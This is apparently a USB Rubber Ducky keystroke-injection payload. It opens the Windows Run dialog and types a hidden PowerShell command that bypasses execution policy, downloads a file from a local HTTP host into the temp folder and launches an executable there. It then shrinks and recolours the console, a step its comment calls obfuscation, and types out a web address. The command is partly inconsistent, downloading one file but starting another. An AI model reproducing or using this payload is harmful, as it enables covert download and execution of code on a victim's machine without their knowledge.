DELAY 3000 
GUI r 
DELAY 200 
STRING powershell -NoP -NonI -W Hidden -Exec Bypass “IEX (New-Object System.Net.WebClient).DownloadFile(‘http://192.168.1.96:8000/vault.swftx’,\”$env:temp\vault.swftx\”); Start-Process \”$env:temp\calc.exe\”” 
ENTER

REM Obfuscate the command prompt
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER

ALT F2
DELAY 50
GUI SPACE
DELAY 50
GUI r
DELAY 50
BACKSPACE
DELAY 100
STRING https://getswifty.pro/download/win/